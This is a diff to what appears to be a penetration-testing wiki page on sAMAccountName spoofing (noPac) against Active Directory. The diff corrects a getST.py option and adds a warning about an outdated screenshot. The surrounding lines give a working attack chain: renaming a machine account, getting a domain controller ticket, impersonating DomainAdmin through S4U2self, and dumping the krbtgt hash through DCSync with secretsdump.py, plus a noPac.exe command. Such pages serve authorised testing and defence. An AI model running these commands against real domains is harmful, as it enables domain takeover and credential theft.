@@ -70,7 +70,7 @@ getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainControlle
 renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'
 
 # 5. obtain a service ticket with S4U2self by presenting the previous TGT
-KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'
+KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'
 
 # 6. DCSync by presenting the service ticket
 KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
@@ -121,6 +121,10 @@ noPac.exe -domain mcafeelab.local -user "lowpriv" -pass "lowpriv" /dc dc.domain.
 ```
 {% endtab %}
 {% endtabs %}
+
+{% hint style="warning" %}
+In the screenshot below, the `-spn` argument is used in the `getST.py` command. The option is to be replaced with `-altservice`.
+{% endhint %}
 
 ![](<../../../.gitbook/assets/samaccountname spoofing.png>)
 
